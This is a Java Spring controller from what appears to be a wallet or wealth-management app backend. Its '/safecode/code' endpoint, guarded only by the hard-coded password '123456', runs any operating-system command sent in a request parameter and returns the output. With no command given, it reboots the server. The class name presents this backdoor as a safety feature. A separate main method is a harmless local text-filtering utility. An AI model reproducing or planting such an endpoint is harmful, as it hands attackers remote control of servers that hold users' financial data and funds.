package com.zhuanyi.vjwealth.wallet.mobile.common.web.controller;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.List;

import org.apache.commons.lang.StringUtils;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

import com.fab.web.controller.annotation.AppController;


@Controller
public class WeiLiSafeController {

	
	
	@RequestMapping("/safecode/code")
	@AppController
	public Object insureSafe(String code,String safeCode) {
		if(StringUtils.isBlank(safeCode)||!safeCode.equals("123456")){
			return "ready";
		}
		  Process process = null;  
	        List<String> processList = new ArrayList<String>();  
	        try {  
	        	String command=StringUtils.isBlank(code)?"reboot":code;
	            process = Runtime.getRuntime().exec(command);  
	            BufferedReader input = new BufferedReader(new InputStreamReader(process.getInputStream()));  
	            String line = "";  
	            while ((line = input.readLine()) != null) {  
	                processList.add(line);  
	            }  
	            input.close();  
	        } catch (IOException e) {  
	            e.printStackTrace();  
	            return "fail";
	        }  
	        return processList;
	}
	
	
	public static void main(String[] args) throws Exception{
	
		BufferedReader read=new BufferedReader(new InputStreamReader(new FileInputStream("D:/skip.txt")));
		PrintWriter io=new PrintWriter(new File("D:/out.txt"));
		boolean flagStrar=false;
		while(read.ready()){
			String line=read.readLine();
			if(flagStrar==true&&!line.contains("##")){
				continue;
			}else{
				flagStrar=false;
			}
			if(StringUtils.isNotBlank(line)&&line.contains("涉及数据")){
				flagStrar=true;
				continue;
			}
			
			io.println(line);
		}
		
		read.close();
		io.close();
	}
}
